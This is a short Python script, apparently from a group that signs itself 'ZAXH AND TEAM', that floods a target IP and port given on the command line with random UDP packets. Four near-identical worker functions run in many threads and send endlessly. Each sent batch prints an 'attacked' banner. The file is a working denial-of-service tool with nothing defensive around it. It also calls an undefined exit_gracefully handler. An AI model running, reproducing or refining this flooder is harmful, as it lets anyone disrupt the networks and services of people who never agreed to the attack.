import signal
import time
import socket
import random
import threading
import sys
import os
from os import system

ip = str(sys.argv[1])
port = int(sys.argv[2])
times = int(sys.argv[3])
threads = int(sys.argv[4])

def run1():
	data = random._urandom(818)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[91mZAXH AND TEAM ATTACKED ON IP {} AND PORT {}".format(ip, port))
		except:
			print("[ # ] ZAXH NIH DEK?!!!!")

def run2():
	data = random._urandom(900)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[91mZAXH AND TEAM ATTACKED ON IP {} AND PORT {}".format(ip, port))
		except:
			print("[ # ] ZAXH NIH DEK?!!!!")

def run3():
	data = random._urandom(1180)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[91mZAXH AND TEAM ATTACKED ON IP {} AND PORT {}".format(ip, port))
		except:
			print("[ # ] ZAXH NIH DEK?!!!!")

def run4():
	data = random._urandom(781)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
				print("\033[91mZAXH AND TEAM ATTACKED ON IP {} AND PORT {}".format(ip, port))
		except:
			print("[ # ] ZAXH NIH DEK?!!!!")

# Multiple threads
os.system('cls' if os.name=='nt' else 'clear')
for x in range(threads):
	attack1 = threading.Thread(target = run1)
	attack1.start()
	attack2 = threading.Thread(target = run2)
	attack2.start()
	attack3 = threading.Thread(target = run3)
	attack3.start()
	attack4 = threading.Thread(target = run4)
	attack4.start()

if __name__ == '__main__':
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)